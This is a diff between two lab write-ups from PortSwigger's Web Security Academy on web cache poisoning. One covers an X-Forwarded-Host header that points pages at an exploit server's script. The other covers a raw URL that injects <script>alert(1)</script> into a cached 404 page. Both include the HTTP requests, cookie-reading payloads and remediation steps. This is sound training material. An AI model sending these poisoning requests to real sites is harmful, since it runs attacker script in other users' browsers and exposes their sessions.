@@ -1,286 +1,96 @@
-# Web Cache Poisoning via an Unkeyed Header
+# Web Cache Poisoning with an Unkeyed URL
 
-## Cover Page
+## Lab Information
 
-**Lab:** Web Cache Poisoning with an Unkeyed Header
-**Platform:** PortSwigger Web Security Academy
-**Category:** Web Cache Poisoning / Host Header Injection
-**Status:** Solved
-**Date:** 31 July 2026
-
----
-
-# Table of Contents
-
-1. Executive Summary
-2. Risk Rating
-3. Vulnerability Information
-4. Affected Asset
-5. Technical Description
-6. Methodology
-7. Relevant HTTP Requests
-8. Proof of Concept (PoC)
-9. Evidence
-10. Impact Analysis
-11. Root Cause
-12. Remediation
-13. References
-14. Conclusion
+- **Platform:** PortSwigger Web Security Academy
+- **Category:** Web Cache Poisoning
+- **Difficulty:** Practitioner
+- **Technique:** Unkeyed URL
 
 ---
 
-# 1. Executive Summary
+# Executive Summary
 
-During the security assessment, a **Web Cache Poisoning** vulnerability was identified due to the unsafe use of the **X-Forwarded-Host** HTTP header.
+The application reflected the requested URL inside a 404 page.
 
-The application trusted this user-controlled header to dynamically generate absolute URLs within the HTML response. Because the caching layer did not include this header as part of its cache key (an **unkeyed header**), an attacker could poison the cache with a malicious response that would subsequently be served to other users.
+While browsers normally URL-encode dangerous characters, poisoning the cache with a raw HTTP request caused the cache to decode the URL before serving it to victims.
 
-By exploiting this behavior, it was possible to replace the legitimate JavaScript resource (`tracking.js`) with a malicious version hosted on an attacker-controlled server, resulting in arbitrary JavaScript execution in victims' browsers.
-
----
-
-# 2. Risk Rating
-
-| Metric       | Value                                                               |
-| ------------ | ------------------------------------------------------------------- |
-| Severity     | High                                                                |
-| CVSS v3.1    | 8.8 (High)                                                          |
-| CWE          | CWE-349 – Acceptance of Extraneous Untrusted Data With Trusted Data |
-| OWASP Top 10 | A05:2021 – Security Misconfiguration                                |
+This resulted in stored XSS.
 
 ---
 
-# 3. Vulnerability Information
+# Discovery
 
-**Vulnerability Type**
+A non-existent resource was requested:
 
-Web Cache Poisoning via an Unkeyed HTTP Header.
-
-**Affected Header**
-
-```http
-X-Forwarded-Host
+```
+GET /random
 ```
 
-**Affected Resource**
-
-```text
-/
-```
-
----
-
-# 4. Affected Asset
-
-The application's homepage.
-
-The HTML response dynamically generated an absolute URL pointing to the JavaScript resource:
-
-```text
-/resources/js/tracking.js
-```
-
----
-
-# 5. Technical Description
-
-The application generated the JavaScript resource URL using the value supplied in the following HTTP header:
-
-```http
-X-Forwarded-Host
-```
-
-For example, supplying:
-
-```http
-X-Forwarded-Host: exploit-server.net
-```
-
-caused the application to generate the following HTML:
+Response:
 
 ```html
-<script src="https://exploit-server.net/resources/js/tracking.js"></script>
+<p>Not Found: /random</p>
 ```
 
-The generated response was then stored by the caching layer.
-
-Since the `X-Forwarded-Host` header was **not included in the cache key**, subsequent users requesting the homepage received the poisoned cached response, causing their browsers to load and execute attacker-controlled JavaScript.
+The requested path was reflected directly.
 
 ---
 
-# 6. Methodology
+# Exploitation
 
-1. Captured the homepage request using Burp Suite.
-2. Sent the request to Burp Repeater.
-3. Added a cache-busting query parameter (`cb=1234`) to force a fresh response.
-4. Added the following HTTP header:
+Poison request:
 
-```http
-X-Forwarded-Host: example.com
+```
+GET /random</p><script>alert(1)</script><p>foo
 ```
 
-5. Verified that the application generated the JavaScript URL using this header.
-6. Confirmed that the response was cacheable by observing:
+The server returned:
 
-```http
+```html
+<p>Not Found: /random</p>
+<script>alert(1)</script>
+<p>foo</p>
+```
+
+After poisoning the cache:
+
+```
 X-Cache: hit
 ```
 
-7. Configured the Exploit Server to host a malicious `tracking.js` file.
-8. Replaced the header value with the attacker-controlled domain.
-9. Replayed the request until the poisoned response was cached.
-10. Verified JavaScript execution in the browser.
+Victims browsing the encoded URL received the decoded cached response, executing the injected JavaScript.
 
 ---
 
-# 7. Relevant HTTP Requests
+# Impact
 
-## Vulnerability Verification
+Persistent reflected XSS delivered through shared cache.
 
-```http
-GET /?cb=1234 HTTP/2
-Host: <LAB-ID>.web-security-academy.net
-X-Forwarded-Host: example.com
-```
+Potential consequences include:
 
----
-
-## Cache Poisoning Request
-
-```http
-GET / HTTP/2
-Host: <LAB-ID>.web-security-academy.net
-X-Forwarded-Host: exploit-XXXX.exploit-server.net
-```
+- Cookie theft
+- Account takeover
+- Session hijacking
+- Arbitrary JavaScript execution
 
 ---
 
-# 8. Proof of Concept (PoC)
+# Root Cause
 
-A malicious JavaScript file was uploaded to the Exploit Server:
-
-```text
-/resources/js/tracking.js
-```
-
-with the following content:
-
-```javascript
-alert(document.cookie);
-```
-
-Once the poisoned response was cached, every user requesting the homepage automatically loaded the malicious JavaScript from the attacker's server, resulting in arbitrary script execution.
+The cache normalized URLs differently than browsers, allowing raw and encoded URLs to map to the same cache entry.
 
 ---
 
-# 9. Evidence
+# Remediation
 
-## Original JavaScript Reference
-
-```html
-<script src="/resources/js/tracking.js"></script>
-```
-
----
-
-## Poisoned JavaScript Reference
-
-```html
-<script src="https://exploit-XXXX.exploit-server.net/resources/js/tracking.js"></script>
-```
+- Normalize URLs consistently.
+- Encode reflected paths.
+- Include normalized URLs in cache keys.
+- Avoid caching dynamic error pages.
 
 ---
 
-## Cached Response Confirmation
+# Result
 
-```http
-X-Cache: hit
-```
-
----
-
-## Successful Payload Execution
-
-```javascript
-alert(document.cookie);
-```
-
----
-
-# 10. Impact Analysis
-
-Successful exploitation allows an attacker to:
-
-* Execute arbitrary JavaScript in victims' browsers.
-* Steal session cookies.
-* Capture CSRF tokens.
-* Deliver phishing content.
-* Modify client-side application behavior.
-* Compromise every user receiving the poisoned cached response.
-
-Because the malicious response is stored in the shared cache, a single attack can affect multiple users simultaneously.
-
----
-
-# 11. Root Cause
-
-The vulnerability results from the combination of two independent security issues:
-
-1. The application trusted the client-controlled `X-Forwarded-Host` header when generating dynamic HTML content.
-2. The caching infrastructure did not include this header as part of the cache key (unkeyed header).
-
-Together, these issues allowed attacker-controlled content to be cached and subsequently delivered to legitimate users.
-
----
-
-# 12. Remediation
-
-### High Priority
-
-#### Validate Proxy Headers
-
-Never trust user-controlled headers such as:
-
-* `Host`
-* `X-Forwarded-Host`
-* `Forwarded`
-* `X-Forwarded-Proto`
-
-unless they originate from trusted reverse proxies.
-
----
-
-#### Configure Cache Keys Correctly
-
-Ensure that any request header influencing the generated response is included in the cache key.
-
----
-
-#### Avoid Dynamic Host Generation
-
-Generate absolute URLs using server-side configuration rather than client-supplied values.
-
----
-
-#### Implement a Strong Content Security Policy (CSP)
-
-Restrict JavaScript execution to trusted domains only.
-
----
-
-# 13. References
-
-* PortSwigger Web Security Academy – Web Cache Poisoning.
-* OWASP Web Security Testing Guide.
-* RFC 7234 – Hypertext Transfer Protocol (HTTP/1.1): Caching.
-* CWE-349 – Acceptance of Extraneous Untrusted Data With Trusted Data.
-
----
-
-# 14. Conclusion
-
-The application was vulnerable to **Web Cache Poisoning** due to its unsafe handling of the `X-Forwarded-Host` header combined with an improperly configured caching mechanism.
-
-By poisoning the cache, an attacker could force legitimate users to load attacker-controlled JavaScript, potentially leading to session hijacking, phishing attacks, or complete client-side compromise.
-
-This vulnerability demonstrates how seemingly harmless proxy headers can become critical attack vectors when combined with caching misconfigurations.
+**Lab Successfully Solved**
